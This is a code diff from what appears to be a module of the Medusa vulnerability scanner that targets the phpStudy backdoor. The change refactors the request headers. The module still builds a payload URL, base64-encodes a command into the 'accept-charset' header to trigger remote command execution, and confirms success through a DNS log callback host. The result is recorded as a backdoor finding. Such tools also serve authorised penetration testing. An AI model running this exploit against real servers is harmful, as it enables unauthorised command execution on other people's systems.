@@ -24,7 +24,7 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies = Proxies().result(proxies)
     scheme, url, port = UrlProcessing().result(Url)
     if port is None and scheme == 'https':
@@ -39,20 +39,18 @@ def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
     cmd = base64.b64encode(commandS.encode('utf-8'))
     try:
         payload_url = scheme+"://"+url+ ':' + str(port)+payload
-        headers = {
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-User': '?1',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-            'Sec-Fetch-Site': 'none',
-            'accept-charset': cmd,
-            'Accept-Encoding': 'gzip,deflate',
-            'Accept-Language': 'zh-CN,zh;q=0.9',
-            'User-Agent': RandomAgent
-        }
-        resp = requests.get(payload_url,headers=headers, timeout=5, proxies=proxies,verify=False)
+
+        Headers['Sec-Fetch-Mode']='navigate'
+        Headers['Sec-Fetch-User']='?1'
+        Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
+        Headers['Sec-Fetch-Site']='none'
+        Headers['accept-charset']=cmd
+
+
+        resp = requests.get(payload_url,headers=Headers, timeout=5, proxies=proxies,verify=False)
         time.sleep(2)
         if DL.result():
-            Medusa = "{} 存在phpStudyBackdoor脚本漏洞\r\n漏洞详情:\r\nPayload:{}\r\nHeader:{}\r\nDNSLOG内容:{}\r\n".format(url, payload_url,headers,DL.dns_host())
+            Medusa = "{} 存在phpStudyBackdoor脚本漏洞\r\n漏洞详情:\r\nPayload:{}\r\nHeader:{}\r\nDNSLOG内容:{}\r\n".format(url, payload_url,Headers,DL.dns_host())
             _t = VulnerabilityInfo(Medusa)
             VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
